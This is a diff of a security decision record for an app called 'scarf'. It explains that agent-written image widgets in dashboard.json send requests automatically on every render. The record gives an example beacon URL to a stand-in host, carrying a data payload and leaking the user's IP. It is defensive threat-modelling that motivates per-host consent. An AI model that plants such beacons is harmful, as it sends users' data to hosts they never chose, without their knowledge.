@@ -5,9 +5,11 @@ permalink: scarf/decisions/remote-image-widgets-are-a-per-project-host-beacon-ga
 tags: [security, projects, widgets, consent]
 source_paths: [scarf/Packages/ScarfCore/Sources/ScarfCore/Services/ImageHostConsentStore.swift, scarf/scarf/Features/Projects/Views/Widgets/ImageWidgetView.swift, scarf/Packages/ScarfCore/Sources/ScarfCore/Services/MiniAppOpenURLPolicy.swift, scarf/scarf/Features/Projects/MiniApp/ScarfMiniAppBridge.swift]
 source_paths_inferred: false
-source_sha: 2c964c9894ab73b47b209b5a0395e07b7250a847
+source_sha: 7e6326c20d55aff25b9d9bb5be70e80881404361
 created: 2026-09-04
 updated: 2026-09-04
+reviewed: 2026-09-04
+reviewed_by: audit:claude-code (background)
 ---
 
 P8 SEC-M4. An image widget in `.scarf/dashboard.json` fires its request the moment the dashboard renders — no click, no chrome, nothing to decline — and the dashboard re-renders on every watcher tick. `dashboard.json` is agent-written, so the widget was a beacon the agent aimed: `https://x.example/p.png?d=<payload>` is a repeated GET from the user's machine and network, reporting their IP, to a host the user never chose. The earlier https-only restriction closed the `file://` read and the plaintext channel but could not close this, because a remote image IS a request.
